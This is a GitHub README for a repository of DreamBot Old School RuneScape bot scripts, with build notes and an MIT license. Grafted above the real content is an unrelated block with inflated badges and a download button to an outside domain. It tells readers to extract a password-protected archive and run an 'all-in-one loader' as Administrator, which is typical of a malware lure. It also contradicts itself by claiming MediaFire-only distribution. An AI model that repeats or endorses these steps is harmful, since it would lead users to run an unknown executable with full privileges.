<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# McScripts_Public
Public Repository containing code from certain McScripts for the Dreambot OSRS botting client that have been selectively open sourced.

## Support, releases and license

Status reviewed November 5, 2026. This repository contains selectively published Java source and bundled JAR files for the DreamBot Old School RuneScape client. Treat the installation and compilation notes below as historical instructions. Compatibility with the current DreamBot client, a clean build and the bundled binaries have not been verified in this review. No game client or script was run, and no binary was rebuilt.

There are currently no GitHub releases or tags. The default branch is named `release`; that name does not establish a tested release or a support commitment. The existing source and JAR files are not a newly validated distribution. Future compatibility claims or a new release require a separate build and representative runtime check.

# Historical installation instructions

1. download the desired script binaries found in the jars directory above.
2. Then, navigate to your dreambot installation location, add the script to the scripts directory. You may need to add a Folder with the name of the script and place the jar file inside of it for the script to be recognized.
3. The support status above describes the verification limits; these historical notes do not promise updates.

# Historical compilation instructions
1. clone the repository, and add it to intellij
2. open the project settings and add the McLib module as a module dependency to script you are trying to compile, aswell as the dreambot client.jar found in the botdata directory of your dreambot installation.
3. add an artifact in the artifacts tab of the project settings set to compile to the scripts folder of your dreambot installation
4. open the build -> build artifacts tab and click on the script you want to compile
5. launch dreambot and navigate to local scripts, refresh and run the script.


---

MIT License

Copyright (c) 2018 bmckalip

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
